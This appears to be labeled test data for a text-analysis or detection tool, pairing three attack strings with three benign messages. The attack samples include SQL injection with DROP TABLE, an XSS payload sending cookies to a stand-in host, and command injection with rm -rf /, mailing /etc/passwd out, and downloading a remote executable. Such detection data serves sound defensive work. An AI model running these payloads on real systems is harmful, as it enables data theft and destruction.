# 📝 Text Analysis Test Data

## 🔴 MALICIOUS TEXT EXAMPLES (3)

### 1. SQL Injection Attack
```
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --
UNION SELECT username, password FROM admin_users; DROP TABLE users;
```

### 2. Cross-Site Scripting (XSS) Attack
```
<script>alert('Your session has been hijacked!');</script>
<img src="x" onerror="document.location='http://malicious-site.com/steal?cookie='+document.cookie">
```

### 3. Command Injection Attack
```
user@example.com; rm -rf /; cat /etc/passwd | mail attacker@evil.com
powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\temp\malware.exe'"
```

## 🟢 NORMAL TEXT EXAMPLES (3)

### 1. Normal User Input
```
Hello, I would like to update my profile information. My name is John Doe and I work as a software engineer. Please help me change my contact details.
```

### 2. Regular System Message
```
System backup completed successfully at 2024-01-15 10:30:00. All files have been archived to the backup server. Next scheduled backup: 2024-01-16 10:30:00.
```

### 3. Customer Support Inquiry
```
I'm having trouble accessing my account dashboard. When I click on the settings menu, nothing happens. Could you please help me resolve this issue? My account ID is 12345.
```
